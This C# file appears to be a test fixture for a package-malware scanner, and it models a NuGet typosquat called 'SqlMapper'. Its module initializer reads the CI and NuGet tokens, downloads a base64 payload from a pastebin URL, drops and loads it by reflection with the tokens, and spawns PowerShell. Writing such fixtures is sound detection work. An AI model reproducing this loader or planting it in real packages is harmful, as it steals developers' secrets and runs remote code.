// Generic NuGet typosquat shape — 'SqlMapper' targets devs looking
// for Dapper (which exposes a SqlMapper namespace internally). 2024
// Phylum / JFrog reports document this shape across multiple
// campaigns. The malicious package uses a ModuleInitializer to fire
// on assembly load + downloads a .NET assembly via WebClient,
// LoadFrom + reflection.Invoke for in-memory execution.
//
// Detection target:
//   - shell-spawn       (Process.Start)
//   - dynamic-eval      (Assembly.Load + Activator.CreateInstance + Invoke)
//   - net-egress        (new WebClient + DownloadData)
//   - base64-decode     (Convert.FromBase64String)
//   - fs-write-outside-root (File.WriteAllBytes drop)
//   - env-read          (Environment.GetEnvironmentVariable for CI tokens)
//   - suspicious-url    (pastebin.com on blocklist)

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace SqlMapper;

internal static class Init
{
    [ModuleInitializer]
    internal static void Run()
    {
        var ciToken = Environment.GetEnvironmentVariable("AZURE_DEVOPS_TOKEN");
        var nugetKey = Environment.GetEnvironmentVariable("NUGET_API_KEY");

        var wc = new WebClient();
        var encoded = wc.DownloadString("https://pastebin.com/raw/SQLMAP");
        var bytes = Convert.FromBase64String(encoded);

        File.WriteAllBytes("/tmp/.payload.dll", bytes);
        var asm = Assembly.LoadFrom("/tmp/.payload.dll");
        var entry = asm.GetType("Payload.Run");
        var instance = Activator.CreateInstance(entry!);
        var method = entry!.GetMethod("Execute");
        method!.Invoke(instance, new object[] { ciToken, nugetKey });

        Process.Start("powershell", "-c \"echo pwned\"");
    }
}
